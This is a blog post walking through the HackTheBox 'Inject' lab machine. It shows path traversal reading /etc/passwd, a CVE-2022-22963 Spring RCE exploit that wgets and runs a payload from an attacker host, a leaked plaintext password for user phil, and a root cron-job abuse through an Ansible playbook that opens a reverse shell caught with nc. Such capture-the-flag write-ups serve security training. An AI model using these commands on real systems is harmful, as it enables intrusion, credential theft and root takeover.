<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - Inject Content User flag Nothing running on tcp/80:
~x» curl inject.htb curl: (7) Failed to connect to inject.htb port 80 after 151 ms: Couldn't connect to server But found somethinging with nmap:
~x» sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200 ... 22/tcp open ssh 8080/tcp open http-proxy Target web page found at inject.htb:8080/
Checking html source code:
~x» curl -s http://inject.htb:8080/ | xurls https://www."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - Inject Content User flag Nothing running on tcp/80:
~x» curl inject.htb curl: (7) Failed to connect to inject.htb port 80 after 151 ms: Couldn't connect to server But found somethinging with nmap:
~x» sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200 ... 22/tcp open ssh 8080/tcp open http-proxy Target web page found at inject.htb:8080/
Checking html source code:
~x» curl -s http://inject.htb:8080/ | xurls https://www."><meta property="og:title" content><meta property="og:description" content="easy - Inject Content User flag Nothing running on tcp/80:
~x» curl inject.htb curl: (7) Failed to connect to inject.htb port 80 after 151 ms: Couldn't connect to server But found somethinging with nmap:
~x» sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200 ... 22/tcp open ssh 8080/tcp open http-proxy Target web page found at inject.htb:8080/
Checking html source code:
~x» curl -s http://inject.htb:8080/ | xurls https://www."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/inject/"><meta property="article:section" content="infosec"><title>easy - Inject </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/inject/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---inject>easy - Inject
<a class=heading-link href=#easy---inject><i class="fa fa-link" aria-hidden=true></i></a></h1><h1 id=content>Content
<a class=heading-link href=#content><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Nothing running on tcp/80:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» curl inject.htb
</span></span><span style=display:flex><span>curl: (7) Failed to connect to inject.htb port <span style=color:#0086f7;font-weight:700>80</span> after <span style=color:#0086f7;font-weight:700>151</span> ms: Couldn&#39;t connect to server
</span></span></code></pre></div><p>But found somethinging with nmap:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>22/tcp   open  ssh
</span></span><span style=display:flex><span>8080/tcp open  http-proxy
</span></span></code></pre></div><p>Target web page found at inject.htb:8080/</p><p><figure class=image-container><a href=..//i/2023-03-20_14-28.png><img width="Zodd cloud page%" src=..//i/2023-03-20_14-28.png alt="Zodd cloud page"></a></figure></p><p>Checking html source code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» curl -s http://inject.htb:8080/ | xurls
</span></span><span style=display:flex><span>https://www.youtube.com/embed/qtOIh93Hvuw
</span></span><span style=display:flex><span>~x» curl -s http://inject.htb:8080/ | grep href
</span></span><span style=display:flex><span>  &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span> <span style=color:#fb660a>type</span>=<span style=color:#0086d2>&#34;text/css&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/webjars/bootstrap/css/bootstrap.min.css&#34;</span> /&gt;
</span></span><span style=display:flex><span>  &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;css/test.css&#34;</span> /&gt;
</span></span><span style=display:flex><span>            &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/&#34;</span>&gt;Home&lt;/span&gt;&lt;/a&gt;
</span></span><span style=display:flex><span>            &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;#features&#34;</span>&gt;Features&lt;/a&gt;
</span></span><span style=display:flex><span>            &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;#how-it-works&#34;</span>&gt;How it Works&lt;/a&gt;
</span></span><span style=display:flex><span>            &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/blogs&#34;</span>&gt;Blogs&lt;/a&gt;
</span></span><span style=display:flex><span>            &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;#pricing&#34;</span>&gt;Pricing&lt;/a&gt;
</span></span><span style=display:flex><span>          &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link active&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/upload&#34;</span>&gt;Upload&lt;/a&gt;
</span></span><span style=display:flex><span>          &lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;#&#34;</span> <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;btn btn-primary my-2&#34;</span>&gt;Log in&lt;/a&gt;
</span></span><span style=display:flex><span>          &lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/register&#34;</span> <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;btn btn-secondary my-2&#34;</span>&gt;Sign Up&lt;/a&gt;
</span></span></code></pre></div><p>There are 3 interesting http endpoints:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» curl -I http://inject.htb:8080/{upload,register,blog}
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span>
</span></span><span style=display:flex><span>Content-Type: text/html;<span style=color:#fb660a>charset</span>=UTF-8
</span></span><span style=display:flex><span>Content-Language: en-US
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>1857</span>
</span></span><span style=display:flex><span>Date: Mon, <span style=color:#0086f7;font-weight:700>20</span> Mar <span style=color:#0086f7;font-weight:700>2023</span> 18:32:36 GMT
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span>
</span></span><span style=display:flex><span>Content-Type: text/html;<span style=color:#fb660a>charset</span>=UTF-8
</span></span><span style=display:flex><span>Content-Language: en-US
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>5654</span>
</span></span><span style=display:flex><span>Date: Mon, <span style=color:#0086f7;font-weight:700>20</span> Mar <span style=color:#0086f7;font-weight:700>2023</span> 18:32:36 GMT
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>500</span>
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Transfer-Encoding: chunked
</span></span><span style=display:flex><span>Date: Mon, <span style=color:#0086f7;font-weight:700>20</span> Mar <span style=color:#0086f7;font-weight:700>2023</span> 18:32:36 GMT
</span></span><span style=display:flex><span>Connection: close
</span></span></code></pre></div><ul><li>/register -> under construction</li><li>/blog -> just dummy entries</li><li>/upload -> here there might be something :flag:</li></ul><p>Images can be uploaded (small images only), and the result can be seen in
<a href="http://inject.htb:8080/show_image?img=image.jpg">http://inject.htb:8080/show_image?img=image.jpg</a></p><p><figure class=image-container><a href=..//i/2023-03-20_14-56.png><img width="uploading images%" src=..//i/2023-03-20_14-56.png alt="uploading images"></a></figure></p><p>I&rsquo;ve spent some time trying to inject something while uploading the image but after reading forums I&rsquo;ve realized that it is about how the upload image is presented to you, that is injectable:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» wget -q <span style=color:#0086d2>&#39;http://inject.htb:8080/show_image?img=../../../../../../../etc/passwd&#39;</span> -O -
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style=display:flex><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>frank:x:1000:1000:frank:/home/frank:/bin/bash
</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style=display:flex><span>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>phil:x:1001:1001::/home/phil:/bin/bash
</span></span><span style=display:flex><span>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>_laurel:x:997:996::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>It turns out to be a spring boot app:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» wget -q <span style=color:#0086d2>&#39;http://inject.htb:8080/show_image?img=../../../pom.xml&#39;</span> -O - | ag spring
</span></span><span style=display:flex><span>                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
</span></span><span style=display:flex><span>                &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
</span></span><span style=display:flex><span>        &lt;description&gt;Demo project <span style=color:#fb660a;font-weight:700>for</span> Spring Boot&lt;/description&gt;
</span></span><span style=display:flex><span>                        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
</span></span><span style=display:flex><span>                        &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
</span></span><span style=display:flex><span>                        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
</span></span><span style=display:flex><span>                        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
</span></span><span style=display:flex><span>                        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
</span></span><span style=display:flex><span>                        &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
</span></span><span style=display:flex><span>                        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
</span></span><span style=display:flex><span>                        &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
</span></span><span style=display:flex><span>                        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
</span></span><span style=display:flex><span>                        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
</span></span><span style=display:flex><span>                                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
</span></span><span style=display:flex><span>                                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
</span></span><span style=display:flex><span>                &lt;finalName&gt;spring-webapp&lt;/finalName&gt;
</span></span></code></pre></div><h4 id=exploiting-cve-2022-22963-spring4shell-rce-exploit>Exploiting: CVE-2022-22963: Spring4Shell RCE Exploit
<a class=heading-link href=#exploiting-cve-2022-22963-spring4shell-rce-exploit><i class="fa fa-link" aria-hidden=true></i></a></h4><p>The vuln source (this repo has been recently created :D):
<a href=https://github.com/lemmyz4n3771/CVE-2022-22963-PoC>https://github.com/lemmyz4n3771/CVE-2022-22963-PoC</a></p><p>The simple/test bash script:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» cat z.sh
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/bin/bash</span>
</span></span><span style=display:flex><span>whoami &gt; /tmp/foobar
</span></span></code></pre></div><p>Uploading and executing:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» python3 exploit.py <span style=color:#0086d2>&#39;inject.htb:8080&#39;</span> <span style=color:#0086d2>&#39;wget http://10.10.14.69:8000/z.sh -O /tmp/z.sh&#39;</span>
</span></span><span style=display:flex><span>[+] Host is vulnerable
</span></span><span style=display:flex><span>[+] Command executed
</span></span><span style=display:flex><span>[+] Exploit completed
</span></span><span style=display:flex><span>~x» python3 exploit.py <span style=color:#0086d2>&#39;inject.htb:8080&#39;</span> <span style=color:#0086d2>&#39;chmod +x /tmp/z.sh&#39;</span>
</span></span><span style=display:flex><span>[+] Host is vulnerable
</span></span><span style=display:flex><span>[+] Command executed
</span></span><span style=display:flex><span>[+] Exploit completed
</span></span><span style=display:flex><span>~x» python3 exploit.py <span style=color:#0086d2>&#39;inject.htb:8080&#39;</span> <span style=color:#0086d2>&#39;/tmp/z.sh&#39;</span>
</span></span><span style=display:flex><span>[+] Host is vulnerable
</span></span><span style=display:flex><span>[+] Command executed
</span></span><span style=display:flex><span>[+] Exploit completed
</span></span><span style=display:flex><span>~x»
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~x» curl <span style=color:#0086d2>&#39;http://inject.htb:8080/show_image?img=../../../../../../../../../../tmp/foobar&#39;</span>
</span></span><span style=display:flex><span>frank
</span></span></code></pre></div><p>I was not able to open a reverse bash shell, so I&rsquo;m trying to read the files in the server: <code>find var/www/WebApp/src/main -type f > /tmp/foobar</code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~x» curl -s <span style=color:#0086d2>&#39;http://inject.htb:8080/show_image?img=../../../../../../../../../../tmp/foobar&#39;</span>  | grep -v html
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/static/images/home.jpg
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/static/css/test.css
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/static/css/under.css
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/static/css/style.css
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/static/css/change.css
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/static/css/blog.css
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/META-INF/MANIFEST.MF
</span></span><span style=display:flex><span>var/www/WebApp/src/main/resources/application.properties
</span></span><span style=display:flex><span>var/www/WebApp/src/main/java/com/example/WebApp/WebAppApplication.java
</span></span><span style=display:flex><span>var/www/WebApp/src/main/java/com/example/WebApp/user/User.java
</span></span><span style=display:flex><span>var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java
</span></span><span style=display:flex><span>var/www/WebApp/src/main/java/META-INF/MANIFEST.MF
</span></span></code></pre></div><p>Nothing interesting found. I had to upload the z.sh payload to put my ssh key into ~/.ssh/authorized_keys:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>frank@inject:~$ pwd
</span></span><span style=display:flex><span>/home/frank
</span></span><span style=display:flex><span>frank@inject:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(frank) <span style=color:#fb660a>gid</span>=1000(frank) <span style=color:#fb660a>groups</span>=1000(frank)
</span></span><span style=display:flex><span>frank@inject:~$ ls /home
</span></span><span style=display:flex><span>frank  phil
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>frank@inject:~$ cat .m2/settings.xml
</span></span><span style=display:flex><span>&lt;?xml <span style=color:#fb660a>version</span>=<span style=color:#0086d2>&#34;1.0&#34;</span> <span style=color:#fb660a>encoding</span>=<span style=color:#0086d2>&#34;UTF-8&#34;</span>?&gt;
</span></span><span style=display:flex><span>&lt;settings <span style=color:#fb660a>xmlns</span>=<span style=color:#0086d2>&#34;http://maven.apache.org/POM/4.0.0&#34;</span> xmlns:xsi=<span style=color:#0086d2>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>        xsi:schemaLocation=<span style=color:#0086d2>&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;servers&gt;
</span></span><span style=display:flex><span>    &lt;server&gt;
</span></span><span style=display:flex><span>      &lt;id&gt;Inject&lt;/id&gt;
</span></span><span style=display:flex><span>      &lt;username&gt;phil&lt;/username&gt;
</span></span><span style=display:flex><span>      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
</span></span><span style=display:flex><span>      &lt;privateKey&gt;<span style=color:#0086d2>${</span><span style=color:#fb660a>user</span>.home<span style=color:#0086d2>}</span>/.ssh/id_dsa&lt;/privateKey&gt;
</span></span><span style=display:flex><span>      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
</span></span><span style=display:flex><span>      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
</span></span><span style=display:flex><span>      &lt;configuration&gt;&lt;/configuration&gt;
</span></span><span style=display:flex><span>    &lt;/server&gt;
</span></span><span style=display:flex><span>  &lt;/servers&gt;
</span></span><span style=display:flex><span>&lt;/settings&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>frank@inject:~$ su phil
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>phil@inject:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(phil) <span style=color:#fb660a>gid</span>=1001(phil) <span style=color:#fb660a>groups</span>=1001(phil),50(staff)
</span></span><span style=display:flex><span>phil@inject:~$ ls
</span></span><span style=display:flex><span>user.txt
</span></span></code></pre></div><h2 id=root-flag>Root flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>I had to run this tool in order to enumrate the box:
<a href=https://github.com/DominicBreuker/pspy>https://github.com/DominicBreuker/pspy</a>
- The following lines caught my attention:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>2023/03/20 20:06:01 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>8069</span>   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml
</span></span><span style=display:flex><span>2023/03/20 20:06:01 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>8068</span>   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
</span></span><span style=display:flex><span>2023/03/20 20:06:01 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>8070</span>   | /bin/sh -c sleep <span style=color:#0086f7;font-weight:700>10</span> &amp;&amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;&amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
</span></span><span style=display:flex><span>2023/03/20 20:06:01 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>8071</span>   | /bin/sh -c sleep <span style=color:#0086f7;font-weight:700>10</span> &amp;&amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;&amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
</span></span></code></pre></div><p>There is a cron job that executes ansible-parallel playbooks, whatever is put on this directory is executed: <code>/opt/automation/tasks</code>, check this playbook, it basically copies the root.txt to tmp and also I have a t.sh bash script that opens a reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-yaml data-lang=yaml><span style=display:flex><span>- <span style=color:#fb660a;font-weight:700>hosts</span>:<span style=color:#888> </span>localhost<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>  </span><span style=color:#fb660a;font-weight:700>tasks</span>:<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>  </span>- <span style=color:#fb660a;font-weight:700>name</span>:<span style=color:#888> </span>Copy file yeah<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>    </span><span style=color:#fb660a;font-weight:700>ansible.builtin.copy</span>:<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>      </span><span style=color:#fb660a;font-weight:700>src</span>:<span style=color:#888> </span>/root/root.txt<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>      </span><span style=color:#fb660a;font-weight:700>dest</span>:<span style=color:#888> </span>/tmp/root.txt<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>      </span><span style=color:#fb660a;font-weight:700>owner</span>:<span style=color:#888> </span>phil<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>      </span><span style=color:#fb660a;font-weight:700>group</span>:<span style=color:#888> </span>phil<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>      </span><span style=color:#fb660a;font-weight:700>mode</span>:<span style=color:#888> </span><span style=color:#0086d2>&#39;0644&#39;</span><span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>  </span>- <span style=color:#fb660a;font-weight:700>name</span>:<span style=color:#888> </span>Run remote shell<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>    </span><span style=color:#fb660a;font-weight:700>script</span>:<span style=color:#888> </span>/home/phil/t.sh<span style=color:#888>
</span></span></span></code></pre></div><p>Results?</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>x» nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Connection from 10.129.233.105:48048
</span></span><span style=display:flex><span>sh: 0: can&#39;t access tty; job control turned off
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># id</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pwd</span>
</span></span><span style=display:flex><span>/opt/automation/tasks
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># ls ~/</span>
</span></span><span style=display:flex><span>playbook_1.yml
</span></span><span style=display:flex><span>root.txt
</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
